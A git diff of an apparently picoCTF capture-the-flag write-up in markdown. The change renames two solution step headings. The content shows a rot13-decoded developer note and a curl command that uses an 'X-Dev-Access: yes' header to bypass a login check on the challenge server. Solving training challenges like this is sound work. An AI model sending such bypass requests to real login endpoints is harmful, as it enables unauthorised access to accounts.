@@ -30,10 +30,10 @@ Email: ctf-player@picoctf.org
 <img width="400" height="250" alt="image" src="https://github.com/user-attachments/assets/52d04548-5330-476e-811c-ca97fef00ecb" />  
 
 ## Solution
-**B1:** Decode  
+**Step1:** Decode  
 `ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf` => This is a piece of code encoded with rot13  
 After coding, this is the collected data: `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`   
-**B2:** Exploit  
+**Step2:** Exploit  
 You can use burpsuite to capture requests and send them or you can use Curl to send requests.  
 In this case, I use Curl  
 `curl -X POST http://amiable-citadel.picoctf.net:YourPost/login -H "Content-Type: application/json" -H "X-Dev-Access: yes" -d '{"email":"ctf-player@picoctf.org","password":"123"}'`  
